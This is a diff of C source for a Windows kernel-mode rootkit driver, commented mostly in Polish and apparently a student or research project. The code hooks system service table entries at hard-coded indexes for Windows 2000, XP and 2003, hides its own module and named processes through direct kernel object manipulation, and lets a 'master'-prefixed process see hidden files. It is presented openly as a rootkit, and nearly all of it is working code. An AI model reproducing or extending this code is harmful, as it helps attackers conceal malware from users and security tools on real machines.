@@ -7,21 +7,31 @@
 
 #define		FILE_DEVICE_SHADOW_DRIVER	FILE_DEVICE_UNKNOWN
 
-//IOCTL codes
+// ten kod IOCTL wykorzystujemy do komunikacji z aplikacja
 #define		IOCTL_HIDE_PROCESS			(ULONG) CTL_CODE(FILE_DEVICE_SHADOW_DRIVER, 0x803, METHOD_BUFFERED, FILE_ANY_ACCESS)
 
+// lista zaladowanych modu³ów
 PMODULE_ENTRY	g_PsLoadedModuleList;
 
+// obiekt urzadzenia sterownika rootkita
 PDEVICE_OBJECT	gp_DeviceObject = NULL;
-ULONG			gp_ProcNameOffset = 0;
-PMODULE_ENTRY	gp_HiddenDriver = NULL;
 
+// offsety wybrane 
 NTOSKRNL_OFFSETS    offsets;
+API_INDEXES         currentAPI;
 
+
+// wzory, ktore wyszukujemy w operacjach ukrywania plikow , procesow
 UNICODE_STRING hidePrefixW;
 char *hidePrefixA;
-char *masterPrefix;
+char *rulingProcess;
 
+// indeksy w tablicy ssdt gdzie znajduja sie uslugi, ktore chcemy przechwycic
+API_INDEXES API_2K   =    { 0x20, 0x7D };
+API_INDEXES API_XP   =	  { 0x25, 0x91 };
+API_INDEXES API_2K3  =	  { 0x27, 0x97 }; 
+
+// dostepne konfiguracje offsetow - te systemy sa obslugiwane przez rootkita
 NTOSKRNL_OFFSETS WIN2K_OFFS		= { 0x0, 0x9C, 0xA0 };
 NTOSKRNL_OFFSETS WINXP_OFFS		= { 0x0, 0x84, 0x88 };
 NTOSKRNL_OFFSETS WIN2K3_OFFS	= { 0x0, 0x84, 0x88 };
@@ -52,11 +62,11 @@ VOID ProcessNotify(
        PsLookupProcessByProcessId( hProcessId , &eproc );
        if (eproc != NULL) {
           ULONG len = 0;
-          len = strlen(masterPrefix);
+          len = strlen(rulingProcess);
   		  processName = (PCHAR) ( (ULONG)eproc + offsets.processName);
   		  if (processName!= NULL) {
     		  if (strlen(processName) >= len) {
-                  if (RtlCompareMemory( processName, masterPrefix, len ) == len) {
+                  if (RtlCompareMemory( processName, rulingProcess, len ) == len) {
     //                DbgPrint("OnProcessHide\n");
                     OnProcessHide( (ULONG)hProcessId );                     
                   }
@@ -73,7 +83,7 @@ VOID ProcessNotify(
 
 /*
 * Rejestrowana przy starcie sterownika (DriverEntry) procedura wykonywana podczas 
-* otwarcia uzadzenia sterownika, czy to przez aplikacje trybu uzytkownika czy inny driver.
+* otwarcia urzadzenia sterownika, czy to przez aplikacje trybu uzytkownika czy inny driver.
 * W tym przypadku ze sterownika korzysta aplikacja w user mode.
 */
 
@@ -90,7 +100,7 @@ NTSTATUS OnDriverCreate( IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp )
 
 /*
 * Rejestrowana przy starcie sterownika (DriverEntry) procedura wykonywana podczas 
-* zamykania uzadzenia sterownika, czy to przez aplikacje trybu uzytkownika czy inny driver.
+* zamykania urzadzenia sterownika, czy to przez aplikacje trybu uzytkownika czy inny driver.
 * W tym przypadku ze sterownika korzysta aplikacja w user mode.
 */
 
@@ -120,7 +130,7 @@ VOID OnUnload( IN PDRIVER_OBJECT DriverObject )
 	LARGE_INTEGER  timeout;
 	UNICODE_STRING symbolicLink;
 
-	DbgPrint("myRootkit: OnUnload called: %x \n",DriverObject);
+	DbgPrint("rootkit: wszedlem w OnUnload: %x \n",DriverObject);
 	devExt = (PROOTKIT_EXT)DriverObject->DeviceObject->DeviceExtension; 
 	
 	UnHookApis();
@@ -135,10 +145,10 @@ VOID OnUnload( IN PDRIVER_OBJECT DriverObject )
 
     if ( hidePrefixA )
     	ExFreePool( hidePrefixA );
-   	if ( masterPrefix )
-    	ExFreePool( masterPrefix);
+   	if ( rulingProcess )
+    	ExFreePool( rulingProcess );
 	
-	DbgPrint("OnUnload leaved\n");
+	DbgPrint("rootkit: opuszczam OnUnload\n");
 }
 
 /*
@@ -150,7 +160,7 @@ VOID OnUnload( IN PDRIVER_OBJECT DriverObject )
 NTSTATUS  Driver_IoControl( IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp )
 {
 	NTSTATUS status = STATUS_SUCCESS;
-	PIO_STACK_LOCATION irpStack; 
+	PIO_STACK_LOCATION irpStack;
 	ULONG inputSize;
 	ULONG controlCode;
 	PVOID pInputBuffer;
@@ -197,8 +207,9 @@ NTSTATUS DriverEntry( IN PDRIVER_OBJECT driverObject, IN PUNICODE_STRING theRegi
 	ULONG i;
 	ULONG m,j,k;
 	ULONG procNotifyCount;
+    ULONG procNameOffset;
 
-	DbgPrint("Entered DriverEntry: %x",driverObject);
+	DbgPrint("rootkit: Wszedlem w DriverEntry: %x\n",driverObject);
 
 	driverObject->DriverUnload  = OnUnload;
 
@@ -206,57 +217,69 @@ NTSTATUS DriverEntry( IN PDRIVER_OBJECT driverObject, IN PUNICODE_STRING theRegi
 	for (i = 0; i < IRP_MJ_MAXIMUM_FUNCTION; i++) {
         driverObject->MajorFunction[i] =DispatchGeneral;
     }
-
+    
+    // rejestrowanie procedur obslugi konkretnych pakietow IRP
 	driverObject->MajorFunction[ IRP_MJ_CREATE			] = OnDriverCreate;
 	driverObject->MajorFunction[ IRP_MJ_CLOSE			] = OnDriverClose;
-	driverObject->MajorFunction[ IRP_MJ_DEVICE_CONTROL	] = Driver_IoControl; 
+	driverObject->MajorFunction[ IRP_MJ_DEVICE_CONTROL	] = Driver_IoControl;
 
-	//unicode names initialization
+    // inicjalizacja nazw urzadzen do lancuchow UNICODE
+    // Systemy rodziny Windows NT wewnetrznie uzywaja standardu UNICODE do operacji 
+    // na lancuchach znakow
 	RtlInitUnicodeString( &deviceName, ROOTKIT_DEV_NAME );
 	RtlInitUnicodeString( &symbolicName, ROOTKIT_WIN32_DEV_NAME );
 
 	//we are creating communication object that GUI can use to send requsts to driver
+	// tworzymy obiekt urzadzenia sterownika, za pomoca ktorego aplikacja w user-mode moze sie 
+	// komunikowac ze sterewnikiem (kernel-mode)
 	status = IoCreateDevice( driverObject, sizeof( ROOTKIT_EXT ),
 								&deviceName,
 								FILE_DEVICE_UNKNOWN,			
 								0,
-								TRUE,							//we allow for only one client
+								TRUE,							// TRUE -> tylko jedno otwarcie tego urzadzenia naraz
 								&driverObject->DeviceObject);
 
 	if (status!=STATUS_SUCCESS) {
-		DbgPrint("myRootkit: IoCreateDeviceFailed\n");
+		DbgPrint("rootkit: IoCreateDeviceFailed\n");
 		return status;
 	}
 
 	status = IoCreateSymbolicLink( &symbolicName, &deviceName );
 	if (status!=STATUS_SUCCESS) {
-		DbgPrint("IoCreateSymbolicLink failed\n");
+		DbgPrint("rootkit: IoCreateSymbolicLink failed\n");
 		return status;
 	}
 
+    // alokacja zasobow z pamieci niestronnicowanej
 	hidePrefixA = ExAllocatePool( NonPagedPool, 20);
 	if (hidePrefixA == NULL) {
 		return STATUS_UNSUCCESSFUL;
-	}
-	strcpy( hidePrefixA , "myRootkit");
+	}	
+	
+	// ciag ktory zawiera wzor do ukrycia, wersja ANSI
+	strcpy( hidePrefixA , "rootkit");
 	DbgPrint( "hidePrefixA %s\n",hidePrefixA);
 
-	masterPrefix = ExAllocatePool( NonPagedPool, 10);
-	if (masterPrefix == NULL) {
+	rulingProcess = ExAllocatePool( NonPagedPool, 20);
+	if (rulingProcess == NULL) {
 		return STATUS_UNSUCCESSFUL;
-	}
-	
-	strcpy( masterPrefix , "bill");
-	DbgPrint( "masterPrefix %s\n",masterPrefix);
+	}	
+	// proces rozpoczynajacy sie od tej nazwy bedzie widzial ukryte pliki
+	strcpy( rulingProcess , "master");
+	DbgPrint( "RulingProcess: %s\n",rulingProcess);
 
-	RtlInitUnicodeString( &hidePrefixW, L"myRootkit");	
+	// ciag ktory zawiera wzor do ukrycia, wersja UNICODE   
+	RtlInitUnicodeString( &hidePrefixW, L"rootkit");	
 
 	gp_DeviceObject = driverObject->DeviceObject;
 
-	gp_ProcNameOffset  = GetProcessNameOffset();
+    // wykorzystanie metody zaproponowanej przez Sysinternalsow do znalezienia 
+    // offsetu do nazwy procesu wzgledem poczatku struktury EPROCESS
+	procNameOffset  = GetProcessNameOffset();
 
-	if ( SetupOffsets( gp_ProcNameOffset ) == FALSE ) {
-		DbgPrint("OS Unsupported! Quiting");
+    // rozpoznanie oraz ustawienie offset waznych dla dzialania technik DKOM
+	if ( SetupOffsets( procNameOffset ) == FALSE ) {
+		DbgPrint("System nie wspierany!");
 		return STATUS_UNSUCCESSFUL;
 	}
 
@@ -264,8 +287,6 @@ NTSTATUS DriverEntry( IN PDRIVER_OBJECT driverObject, IN PUNICODE_STRING theRegi
 
 	HideModule();
 
-	SetupIndexes();
-	
 	HookApis();
 	
 	PsSetCreateProcessNotifyRoutine( ProcessNotify , FALSE );
@@ -274,33 +295,12 @@ NTSTATUS DriverEntry( IN PDRIVER_OBJECT driverObject, IN PUNICODE_STRING theRegi
 	return status;
 }
 
-NTSTATUS AbandonRequest(PIRP Irp)
-{
-	DbgPrint("AbandonRequest\n");
-	Irp->IoStatus.Status = STATUS_ACCESS_DENIED;
-	Irp->IoStatus.Information = 0;
-	IoCompleteRequest(Irp, IO_NO_INCREMENT);
-	return STATUS_ACCESS_DENIED;
-}
-
-NTSTATUS CompleteRequest(PIRP Irp)
+NTSTATUS DispatchGeneral(IN PDEVICE_OBJECT DeviceObject,IN PIRP Irp)
 {
 	Irp->IoStatus.Status = STATUS_SUCCESS;
 	Irp->IoStatus.Information = 0;
 	IoCompleteRequest(Irp, IO_NO_INCREMENT);
-	//Irp->IoStatus.Status is gone!!! after we call IoCompleteRequest
 	return STATUS_SUCCESS;
-}
-
-NTSTATUS DispatchGeneral(IN PDEVICE_OBJECT DeviceObject,IN PIRP Irp)
-{
-	if (DeviceObject == gp_DeviceObject) {
-		DbgPrint("Dispach general: DeviceObject: %x \n",DeviceObject);
-		return CompleteRequest(Irp);
-	}	
-	
-    DbgPrint("TO SIE NIE POWINNO WYWOLAC NIGDY\n"); 
-    return STATUS_UNSUCCESSFUL; 
 }
 
 BOOLEAN SetupOffsets(ULONG processNameOffset)
@@ -311,17 +311,20 @@ BOOLEAN SetupOffsets(ULONG processNameOffset)
 	{
 	case 2195:
    		DbgPrint("Wykryto instalacje Windows 2000\n");
-		offsets = WIN2K_OFFS;
+		offsets    = WIN2K_OFFS;
+		currentAPI = API_2K; 
 		break;
 
 	case 2600:
    		DbgPrint("Wykryto instalacje Windows XP\n");
 		offsets = WINXP_OFFS;
+		currentAPI = API_XP; 		
 		break;
 
 	case 3790:		
    		DbgPrint("Wykryto instalacje Windows 2003 Server\n");
 		offsets = WIN2K3_OFFS;
+		currentAPI = API_2K3; 		
 		break;
 	default:
 		return FALSE;
